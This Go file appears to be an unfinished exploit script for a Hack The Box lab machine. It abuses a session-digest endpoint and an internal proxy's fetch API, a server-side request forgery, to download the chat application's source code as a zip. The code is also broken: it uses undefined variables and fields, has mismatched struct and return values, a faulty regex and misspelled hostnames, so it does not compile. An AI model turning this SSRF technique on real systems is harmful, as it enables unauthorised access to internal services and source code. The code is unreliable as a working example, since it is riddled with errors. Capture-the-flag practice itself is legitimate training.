package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"os"
	"regexp"
)

// Help from
// https://golangbyexample.com/cookies-golang/
// https://pkg.go.dev/net/http/cookiejar@go1.20.6
// https://pkg.go.dev/regexp#MatchString - check
// https://go.dev/blog/json
// https://golangtutorial.dev/tips/http-post-json-go/
// https://zetcode.com/golang/writefile/
// https://pkg.go.dev/encoding/base64#NewDecoder

type apiFetchReq struct {
	url            string
	url_digest     string
	method         string
	session_digest string
}

func main() {
	downloadURL("http://chat.response.htb")
	fmt.Println()
}

func getDigest(fetchThisURL string) (string, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalf("Got error while creating cookie jar %s", err.Error())
	}
	cookie := &http.Cookie{
		Name:  "PHPSESSID",
		Value: fetchThisURL,
	}
	client := &http.Client{Jar: jar}
	request, err := http.NewRequest("GET", "http://www.reponse.htb/status/main.js.php", nil)
	if err != nil {
		log.Fatalf("Got error %s", err.Error())
	}
	request.AddCookie(cookie)

	response, err := client.Do(req)
	if err != nil {
		log.Fatalf("Error occured. Error is: %s", err.Error())
	}
	defer response.Body.Close()

	reEx := regexp.MustCompile(`'session_digest':'(0-9a-f)*'`)
	getSessionDigest := reEx.Find([]byte(response.ext))
	fmt.Println("Session Digest: %s", getSessionDigest)

	return getSessionDigest
}

func downloadURL(fetchThisURL string) error {
	urlDigest := getDigest(url)
	payload := apiFetchReq{fetchThisURL, urlDigest, "GET", session, sessionDigest}
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		log.Fatalf("Got error %s", err.Error())
	}
	request, err := http.NewRequest("POST", "http://proxy.reponse.htb/fetch", bytes.NewBuffer(jsonPayload))
	request.Header.Set("Content-Type", "application/json; charset=UTF-8")
	if err != nil {
		log.Fatalf("Got error %s", err.Error())
	}
	response, err := client.Do(request)
	if err != nil {
		log.Fatalf("Error occured. Error is: %s", err.Error())
	}
	defer response.Body.Close()

	b64Body, _ := ioutil.ReadAll(response.Body)
	dst := make([]byte, base64.StdEncoding.DecodedLen(len(b64Body)))
	sourceCode, err := base64.StdEncoding.Decode(dst, []byte(b64Body))
	if err != nil {
		log.Fatalf("Got error %s", err.Error())
	}

	f, err := os.Create("chat_source.zip")
	if err != nil {
		log.Fatalf("Got error %s", err.Error())
	}
	defer f.Close()
	base64.NewDecoder()

	_, err := f.Write(sourceCode)
	if err != nil {
		log.Fatalf("Got error %s", err.Error())
	}

	return nil
}

